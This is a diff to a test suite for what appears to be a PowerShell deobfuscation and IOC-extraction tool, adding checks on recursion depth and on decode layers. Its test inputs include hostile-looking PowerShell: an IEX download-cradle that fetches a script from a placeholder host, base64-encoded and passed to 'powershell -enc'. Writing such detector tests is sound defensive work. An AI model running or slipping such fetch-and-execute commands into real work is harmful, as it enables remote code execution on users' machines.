@@ -69,9 +69,10 @@ describe('analyze — deobfuscation (Phase 2a)', () => {
     expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
   })
   it('caps recursion and never hangs on self-referential input', async () => {
-    // must return (not hang); assertion is simply that it resolves
+    // must return (not hang) and keep the layer chain bounded
     const r = await analyze("$x = 'IEX $x' ; IEX $x")
     expect(r).toBeDefined()
+    expect(r.layers.length).toBeLessThan(10)
   })
 
   it('extracts IOCs from every decode layer, not just the last (dual-stage)', async () => {
@@ -85,6 +86,13 @@ describe('analyze — deobfuscation (Phase 2a)', () => {
     // layerIndex points at the true AnalysisResult.layers entry
     expect(r.iocs.find((i) => i.raw === 'http://stage0.test/x')?.layerIndex).toBe(0)
     expect(r.iocs.find((i) => i.raw === 'http://stage1.test/y')?.layerIndex).toBe(1)
+  })
+
+  it('does not add a resolve layer when nothing was folded or substituted', async () => {
+    const clean = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    const r = await analyze(`powershell -enc ${encB64(clean)}`)
+    expect(r.layers.some((l) => /resolve/i.test(l.transform))).toBe(false)
+    expect(r.iocs.map((i) => i.raw)).toContain('http://x.test/a') // IOC still surfaces
   })
 })
 
